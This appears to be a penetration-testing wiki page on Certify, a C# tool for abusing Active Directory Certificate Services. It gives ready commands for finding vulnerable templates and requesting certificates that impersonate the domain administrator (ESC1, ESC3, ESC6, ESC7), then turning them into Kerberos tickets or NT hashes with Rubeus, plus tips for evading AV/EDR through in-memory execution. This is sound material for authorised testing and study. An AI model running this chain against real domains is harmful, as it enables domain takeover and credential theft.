---
title: "Certify"
type: tool
tags: [active-directory, adcs, certificates, esc1, esc8, kerberos, windows]
date_created: 2026-07-02
date_updated: 2026-07-02
sources: [github-ghostpack-certify, specterops-certified-pre-owned]
phase: aux
---

## Purpose

**Certify** is a C# tool (GhostPack) for enumerating and abusing Active Directory Certificate Services (ADCS). It is the Windows-side companion to [[certipy]]: it locates CAs and certificate templates, flags vulnerable configurations (the ESC1 through ESC8 family), requests certificates including with an attacker-chosen Subject Alternative Name (the core of ESC1/ESC6), and downloads issued certificates. The resulting certificate is fed to `Rubeus asktgt /certificate` to obtain a TGT (certificate to Kerberos).

## Installation

Certify ships as source; run a compiled binary or load the assembly in memory.

```bash
# Build from source (Windows dev box)
msbuild Certify.sln /p:Configuration=Release
# -> Certify\bin\Release\Certify.exe
```

Precompiled binaries are commonly pulled from SharpCollection. On an engagement Certify is usually run without touching disk:

```
# Cobalt Strike / Sliver: execute-assembly Certify.exe <args>
```

Requires .NET Framework on the target (default on modern Windows). The classic 1.x CLI is documented below; Certify 2.0 (2024) reorganized the CLI into subcommands and widened ESC coverage (see Tips).

## Core usage

General form: `Certify.exe <command> [/flag:value ...]`. Run `Certify.exe` with no arguments for the command list.

### Enumerate CAs and templates (find)

```
# List the enterprise CAs (gives the CA name string used elsewhere)
Certify.exe cas

# Enumerate all templates
Certify.exe find

# Only templates that are vulnerable to a known ESC
Certify.exe find /vulnerable

# Vulnerable specifically to the current user's rights
Certify.exe find /vulnerable /currentuser

# Templates where the enrollee supplies the subject (ESC1 core condition)
Certify.exe find /enrolleeSuppliesSubject

# Templates granting a client-authentication EKU
Certify.exe find /clientauth

# Scope to one CA, or dump JSON for later parsing
Certify.exe find /ca:CA01.corp.local\corp-CA01-CA
Certify.exe find /json /outfile:C:\certs.json
```

`find /vulnerable` reports enrollment rights, EKUs, the `ENROLLEE_SUPPLIES_SUBJECT` flag, manager-approval state, and the CA `EDITF_ATTRIBUTESUBJECTALTNAME2` flag, mapping each to its ESC class.

### Request a certificate (ESC1 alternate SAN)

```
# Normal enrollment
Certify.exe request /ca:CA01.corp.local\corp-CA01-CA /template:User

# ESC1: enroll on a vulnerable template but supply an alternate subject (impersonate Domain Admin)
Certify.exe request /ca:CA01.corp.local\corp-CA01-CA /template:VulnTemplate /altname:administrator

# ESC1 with an explicit UPN
Certify.exe request /ca:CA01.corp.local\corp-CA01-CA /template:VulnTemplate /altname:administrator@corp.local

# ESC6: CA has EDITF_ATTRIBUTESUBJECTALTNAME2 set, so any enrollable template plus /altname works
Certify.exe request /ca:CA01.corp.local\corp-CA01-CA /template:User /altname:administrator

# ESC3: request on behalf of another user using an enrollment-agent certificate
Certify.exe request /ca:CA01.corp.local\corp-CA01-CA /template:User \
  /onbehalfof:CORP\administrator /enrollcert:agent.pfx /enrollcertpw:pass

# Machine certificate (enroll as the current computer account)
Certify.exe request /ca:CA01.corp.local\corp-CA01-CA /template:Machine /machine
```

Certify prints the private key and certificate in PEM. Combine them into a `.pfx`, then request a TGT:

```bash
# Paste Certify's key + cert block into cert.pem, then:
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

```
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:<pfxpass> /ptt
```

### Download an issued certificate (download)

```
Certify.exe download /ca:CA01.corp.local\corp-CA01-CA /id:1337
```

Retrieve a previously requested or newly issued certificate by request ID. This is the retrieval step of ESC7, after a pending SubCA request has been approved.

## Common use cases

Certify enumerates and requests; each vulnerable configuration maps to a technique page:

- ESC1 (enrollee supplies subject, client-auth EKU): `find /vulnerable` then `request /altname:administrator` : [[active-directory-certificate-esc1]].
- ESC2 (Any Purpose or no EKU): [[active-directory-certificate-esc2]].
- ESC3 (enrollment-agent template): `request /onbehalfof` : [[active-directory-certificate-esc3]].
- ESC4 (template ACL is writable): edit the template to be ESC1, then request. Certify does not edit templates; use PowerView `Set-DomainObject` or [[certipy]] `template`. Reference: [[active-directory-certificate-esc4]].
- ESC6 (CA `EDITF_ATTRIBUTESUBJECTALTNAME2`): any template plus `/altname` : [[active-directory-certificate-esc6]].
- ESC7 (`ManageCA` / `ManageCertificates`): issue a pending request, then `Certify.exe download /id:` : [[active-directory-certificate-esc7]].
- ESC8 (web enrollment accepts NTLM): Certify flags the HTTP endpoint in `find`; exploit by relaying coerced auth with `ntlmrelayx --adcs` or `certipy relay` : [[active-directory-certificate-esc8]], [[internal-ntlm-relay]].
- Overview and background: [[active-directory-certificate-esc-attacks]], [[active-directory-certificate-services]], [[adcs]].

Once a certificate is obtained, authenticate to Kerberos with `Rubeus asktgt /certificate` (see [[rubeus]]) to get a TGT or, with `/getcredentials`, the account NT hash.

## Tips and gotchas

- CA name format: use the exact `CA_HOST\CA_NAME` string from `Certify.exe cas` (for example `CA01.corp.local\corp-CA01-CA`), not just the CA short name.
- Certify emits PEM (certificate plus private key). Build a `.pfx` with `openssl pkcs12 -export` before handing it to Rubeus or `certutil`.
- ESC1 needs three conditions together: `ENROLLEE_SUPPLIES_SUBJECT`, a client-authentication (or Any Purpose) EKU, and enrollment rights for your principal. `find /vulnerable` confirms all three.
- Strong certificate mapping (KB5014754, post-May 2022) makes the KDC require the account SID inside the certificate. Classic Certify may not embed the SID, so `Rubeus asktgt` can fail; fall back to [[certipy]] `req -sid <SID>`, which writes the szOID SID extension.
- Certify 2.0 (2024) rewrote the CLI into subcommands and added detection/abuse for ESC9, ESC11, ESC13, ESC14, ESC15, and ESC16; the flags above are the classic 1.x form. Run `Certify.exe --help` to confirm the syntax of the build you have.
- Certify is heavily signatured by AV/EDR. Run it via `execute-assembly` or an in-memory loader.
- On Linux, [[certipy]] covers the full ESC suite in one tool, including relay, shadow credentials, forge, and ESC7 automation.

## Related

- [[certipy]] : the Linux equivalent and the more complete ESC toolkit.
- [[rubeus]] : turns a Certify-issued certificate into a TGT or NT hash.
- [[impacket]] : `ntlmrelayx.py --adcs` for the ESC8 relay.
- [[bloodhound]] : surfaces the certificate-template and CA relationships worth targeting.

## Sources

- GhostPack/Certify README: https://github.com/GhostPack/Certify
- Will Schroeder and Lee Christensen, "Certified Pre-Owned: Abusing Active Directory Certificate Services" (SpecterOps whitepaper)
